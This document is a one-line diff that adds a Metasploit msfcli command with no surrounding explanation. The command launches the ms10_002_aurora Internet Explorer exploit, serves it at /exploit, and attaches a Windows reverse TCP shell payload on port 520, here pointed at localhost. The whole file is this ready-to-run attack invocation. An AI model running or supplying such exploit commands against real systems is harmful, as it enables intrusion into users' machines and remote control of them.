@@ -1,0 +1,1 @@
+sudo msfcli exploit/windows/browser/ms10_002_aurora LHOST=127.0.0.1 SRVHOST=127.0.0.1 URIPATH=/exploit PAYLOAD=windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=520 E
